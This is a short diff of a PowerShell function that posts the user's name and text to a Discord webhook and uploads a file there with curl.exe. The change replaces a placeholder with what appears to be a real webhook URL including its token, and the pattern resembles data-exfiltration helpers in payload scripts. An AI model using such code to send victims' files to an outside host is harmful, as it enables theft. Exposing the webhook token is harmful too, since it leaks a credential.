@@ -47,15 +47,17 @@ param (
     [string]$text 
 )
 
-$hookurl = 'YOUR-DISCORD-WEBHOOK'
+$hookurl = 'https://discord.com/api/webhooks/1041572355253751808/hLhWPx-jrl6MKvpck-DqIIhm8C1ZWfGoRc035oj_6ahnZQc6j3efu43O-x-Iq597hMtu'
 
 $Body = @{
   'username' = $env:username
   'content' = $text
 }
 
-Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json);
-curl.exe -F "file1=@$file" $hookurl
+if (-not ([string]::IsNullOrEmpty($text))){
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
+
+if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 ```
 
